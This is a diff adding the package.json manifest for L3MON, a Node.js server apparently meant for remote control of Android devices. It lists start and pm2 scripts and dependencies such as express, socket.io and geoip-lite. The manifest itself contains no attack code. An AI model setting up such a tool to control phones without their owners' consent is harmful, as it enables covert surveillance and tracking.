@@ -1,0 +1,35 @@
+{
+  "name": "L3MON",
+  "version": "2.0.0",
+  "description": "L3MON - Remote Android Management Suite (Updated for Java 17+)",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "dev": "node --watch index.js",
+    "test": "node index.js",
+    "pm2:start": "pm2 start index.js --name L3MON",
+    "pm2:stop": "pm2 stop L3MON",
+    "pm2:restart": "pm2 restart L3MON",
+    "pm2:logs": "pm2 logs L3MON"
+  },
+  "engines": {
+    "node": ">=16.0.0"
+  },
+  "author": "D3VL",
+  "license": "ISC",
+  "keywords": [
+    "android",
+    "remote",
+    "management",
+    "nodejs"
+  ],
+  "dependencies": {
+    "body-parser": "^1.19.0",
+    "cookie-parser": "^1.4.4",
+    "ejs": "^2.6.2",
+    "express": "^4.17.1",
+    "geoip-lite": "^1.3.7",
+    "lowdb": "^1.0.0",
+    "socket.io": "^2.2.0"
+  }
+}
